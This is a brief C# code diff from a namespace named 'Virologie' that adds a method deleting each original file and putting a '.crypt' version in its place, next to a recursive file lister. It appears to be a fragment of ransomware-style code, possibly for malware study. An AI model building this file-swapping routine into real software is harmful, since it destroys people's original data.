@@ -14,5 +14,12 @@ namespace Virologie
         {
             return Directory.EnumerateFiles(startDir, filter, SearchOption.AllDirectories);
         }
+
+        public void ReplaceFile(string name)
+        {
+            if (!File.Exists(name + ".crypt")) return;
+            File.Delete(name);
+            File.Move(name + ".crypt", name);
+        }
     }
 }
